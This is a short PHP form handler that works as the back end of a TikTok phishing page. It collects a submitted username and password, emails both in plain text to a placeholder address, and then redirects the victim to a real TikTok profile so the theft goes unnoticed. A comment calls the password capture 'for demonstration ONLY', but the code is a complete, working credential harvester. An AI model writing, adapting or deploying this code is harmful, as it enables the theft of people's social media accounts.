<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Sanitize input
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']); // For demonstration ONLY

    // Set email details
    $to = "your_email@example.com"; // ✅ Replace with your email
    $subject = "New Form Submission";
    $message = "Tiktok Username: $email\nPassword: $password";
    $headers = "From: no-reply@yourdomain.com";

    // Send the email
    if (mail($to, $subject, $message, $headers)) {
        // ✅ Redirect after email is sent
        header('Location: https://www.tiktok.com/@quinagfashions?_t=ZM-8vfH473klCp&_r=1');
        exit();
    } else {
        echo "Email sending failed.";
    }
}
?>
